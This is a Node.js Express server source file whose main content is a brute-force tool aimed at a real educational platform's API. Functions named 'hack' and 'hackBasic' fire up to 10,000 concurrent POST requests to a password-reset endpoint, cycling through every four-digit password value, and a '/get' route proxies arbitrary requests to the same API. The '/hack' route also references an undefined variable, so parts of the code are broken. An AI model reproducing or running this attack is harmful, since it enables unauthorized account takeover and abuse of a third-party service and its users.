import express from "express";
import path from "path";
import readline from "readline";
import { fileURLToPath } from "url";

const app = express();
const port = process.env.PORT || 80;

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(express.json());

app.post("/hack", async (req, res) => {
  const data = req.body;
  console.log("Received data:", data);

  res.json(response);
});

async function hack(endpoint, total = 10000, limit = 100) {
  let active = 0;
  let index = 0;

  return new Promise((resolve, reject) => {
    let results = [];
    let completed = 0;

    function next() {
      if (completed >= total) return resolve(results);

      while (active < limit && index < total) {
        ++active;

        fetch(
          "https://cs-api.pltw.org/" + endpoint + "/reset?password=" + index,
          { method: "POST" }
        )
          .then((r) => r.text())
          .then((body) => {
            results[index] = body;
          })
          .catch((err) => {
            results[index] = `error: ${err}`;
          })
          .finally(() => {
            --active;
            ++completed;
            next(); // schedule more
          });

        ++index;
      }
    }

    next(); // start it
  });
}

async function hackBasic(endpoint) {
  let requests = [];
  let responses = [];

  for (let i = 0; i <= 9999; ++i) {
    requests.push(
      fetch("https://cs-api.pltw.org/" + endpoint + "/reset?password=" + i, {
        method: "POST",
      })
        .then((r) => r.text())
        .catch((err) => `error: ${err}`)
    );
  }

  responses = await Promise.all(requests);

  return new Promise((resolve, reject) => {
    resolve(responses);
  });
}

app.post("/get", async (req, res) => {
  const data = req.body;
  console.log(data);
  const payload = { text: await getData(data.endpoint) };
  res.json(payload);
  console.log(payload);
});

async function getData(endpoint) {
  const response = await fetch("https://cs-api.pltw.org/" + endpoint);
  return response.text();
}

app.use(express.static(path.join(__dirname, "public")));

const server = app.listen(port, () => {
  console.log(`Server is running on port ${port}`);

  // Only do this when running locally
  if (!process.env.RENDER) {
    console.log("\nPress Enter to stop the server");
    waitForInput();
  }
});

function waitForInput() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  rl.on("line", () => {
    console.log("Stopping server...");
    server.close(() => {
      console.log("Server stopped");
      process.exit(0);
    });
  });
}
